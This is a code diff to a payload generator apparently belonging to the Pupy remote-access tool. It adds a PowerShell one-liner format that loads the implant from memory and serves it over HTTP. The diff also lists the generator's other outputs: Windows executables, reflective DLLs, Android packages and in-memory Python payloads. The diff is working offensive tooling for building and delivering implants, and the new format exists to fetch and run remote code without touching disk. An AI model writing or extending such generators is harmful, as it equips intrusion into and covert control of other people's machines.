@@ -6,8 +6,8 @@
 import logging, argparse, sys, os.path, re, shlex, random, string, zipfile, tarfile, tempfile, shutil, subprocess, traceback, pkgutil
 from pupylib.utils.network import get_local_ip
 from pupylib.utils.term import colorize
-from pupylib.payloads.py_oneliner import serve_payload, pack_py_payload
 from pupylib.payloads.python_packer import gen_package_pickled_dic
+from pupylib.payloads.py_oneliner import serve_payload, pack_py_payload
 from pupylib.utils.obfuscate import compress_encode_obfs
 from network.conf import transports, launchers
 from network.lib.base_launcher import LauncherError
@@ -226,7 +226,8 @@ class ListOptions(argparse.Action):
         print "\t- exe_86, exe_x64 : generate PE exe for windows"
         print "\t- dll_86, dll_x64 : generate reflective dll for windows"
         print "\t- py              : generate a fully packaged python file (with all the dependencies packaged and executed from memory), all os (need the python interpreter installed)"
-        print "\t- py_oneliner     : same as \"py\" format but served over http to load it from a single command line"
+        print "\t- py_oneliner     : same as \"py\" format but served over http to load it from memory with a single command line."
+        print "\t- ps1_oneliner    : load pupy remotely from memory with a single command line using powershell."
 
         print ""
         print colorize("## available transports :","green")+" usage: -t <transport>"
@@ -243,7 +244,7 @@ class ListOptions(argparse.Action):
             print '\n'.join(["\t"+x for x in sc.get_help().split("\n")])
         exit()
 
-PAYLOAD_FORMATS=['apk', 'exe_x86', 'exe_x64', 'dll_x86', 'dll_x64', 'py', 'py_oneliner']
+PAYLOAD_FORMATS=['apk', 'exe_x86', 'exe_x64', 'dll_x86', 'dll_x64', 'py', 'py_oneliner', 'ps1_oneliner']
 if __name__=="__main__":
     if os.path.dirname(__file__):
         os.chdir(os.path.dirname(__file__))
@@ -291,7 +292,6 @@ if __name__=="__main__":
     conf['launcher']=args.launcher
     conf['launcher_args']=args.launcher_args
     conf['offline_script']=script_code
-
     outpath=args.output
     if args.format=="exe_x86":
         binary=get_edit_pupyx86_exe(conf)
@@ -332,6 +332,11 @@ if __name__=="__main__":
         i=conf["launcher_args"].index("--host")+1
         link_ip=conf["launcher_args"][i].split(":",1)[0]
         serve_payload(packed_payload, link_ip=link_ip)
+    elif args.format=="ps1_oneliner":
+        from pupylib.payloads.ps1_oneliner import serve_ps1_payload
+        i=conf["launcher_args"].index("--host")+1
+        link_ip=conf["launcher_args"][i].split(":",1)[0]
+        serve_ps1_payload(conf, link_ip=link_ip)
     else:
         exit("Type %s is invalid."%(args.format))
     print(colorize("[+] ","green")+"payload successfully generated with config :")
